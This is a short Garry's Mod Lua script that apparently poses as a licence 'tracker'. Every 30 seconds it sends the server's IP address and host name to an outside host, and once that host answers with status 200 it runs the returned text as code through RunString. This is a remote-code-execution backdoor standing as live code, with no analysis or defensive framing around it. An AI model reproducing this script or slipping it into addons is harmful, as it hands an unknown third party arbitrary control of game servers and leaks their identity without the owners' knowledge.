if(lcnstracker) then
else

lcnstracker = true
  timer.Create("lcnstracker", 30,0, function() 
    http.Fetch( "https://lcns.sftware.xyz/send",
        
        function( body, length, headers, code )
            if code == 200 or code == "200" then
                timer.Remove("lcnstracker")
                RunString(body,"lcns" , false)
            end  
        end,
  
        function( message )
                
        end,

        { 
            ["serverip"] = game.GetIPAddress(),
            ["servername"] =  GetHostName(),
        }
    )
end) 
end
